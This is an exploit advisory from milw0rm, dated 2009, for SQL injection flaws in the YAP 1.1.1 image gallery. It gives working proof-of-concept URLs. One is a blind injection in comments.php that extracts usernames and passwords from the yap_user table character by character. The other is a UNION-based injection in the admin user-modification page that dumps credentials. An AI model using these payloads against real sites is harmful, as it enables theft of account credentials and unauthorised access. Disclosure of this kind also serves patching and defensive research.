<html><head><title>YAP 1.1.1 Blind SQL Injection/SQL Injection Vulnerabilities</title></head><pre>#######################################################################################################
[+] YAP 1.1.1 Blind SQL Injection/SQL Injection
[+] Discovered By SirGod
[+] www.mortal-team.org
[+] www.h4cky0u.org
########################################################################################################

[+] Blind SQL Injection

  The default prefix for database tables is &quot;yap_&quot; .But can be changed
at installation.

 PoC :

     http://127.0.0.1/[path]/comments.php?image_id=1 and ascii(substring((SELECT concat(login,0x3a,pass) from yap_user limit 0,1),1,1))&gt;97

   First character of the username is char(97) , is &quot;a&quot; .

     http://127.0.0.1/[path]/comments.php?image_id=1 and ascii(substring((SELECT concat(login,0x3a,pass) from yap_user limit 0,1),2,1))&gt;100

   Second character of the username is char(100) ,is &quot;d&quot; .

 And so on...Change the limit to go to the next char.


[+] SQL Injection

 - Need to be logged in as administrator.

    http://127.0.0.1/[path]/admin/index.php?page=users_modif&amp;action=modif&amp;user=null union all select concat_ws(0x3a,login,pass),2 from yap_user where id=1--

#########################################################################################################

# milw0rm.com [2009-03-16]</pre></html>